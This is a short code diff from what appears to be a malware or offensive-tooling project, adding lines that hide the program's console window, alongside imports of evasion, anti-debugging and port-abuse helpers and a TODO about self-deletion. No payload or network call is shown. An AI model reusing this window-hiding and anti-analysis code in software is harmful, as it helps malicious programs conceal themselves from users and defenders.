@@ -9,6 +9,9 @@ from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep
 from Exploitation.common import abuse_open_ports
 from Evasion.Randomize import random_base64,random_byte,random_list,random_a85
 from random import randrange,choice
+import win32gui, win32con
+the_program_to_hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
 #//TODO: instead of sys.exit. spawn subprocess to delete the whole thing before.
 def main():
     Thread(target=debugEvasion.process_monitor,args=()).start()
